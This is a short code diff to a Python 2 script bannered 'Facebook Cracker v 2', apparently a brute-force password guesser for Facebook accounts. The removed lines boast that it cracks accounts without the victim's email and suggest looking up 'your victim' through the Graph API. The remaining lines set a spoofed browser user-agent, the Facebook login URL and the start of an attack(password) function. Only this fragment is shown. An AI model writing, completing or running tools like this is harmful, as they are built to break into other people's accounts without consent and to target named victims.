@@ -29,16 +29,10 @@ GHT = '''
         |..........Facebook Cracker v 2.........|
         +---------------------------------------+
 '''
-print "Note: - This tool can crack facebook account even if you don't have the email of your victim"
-print "# Hit CTRL+C to quit the program"
-print "# Use www.graph.facebook.com for more infos about your victim ^_^"
-  
-  
+
 email = sys.argv[1]
   
-useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-  
-  
+useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')] 
   
 login = 'https://www.facebook.com/login.php?login_attempt=1'
 def attack(password):
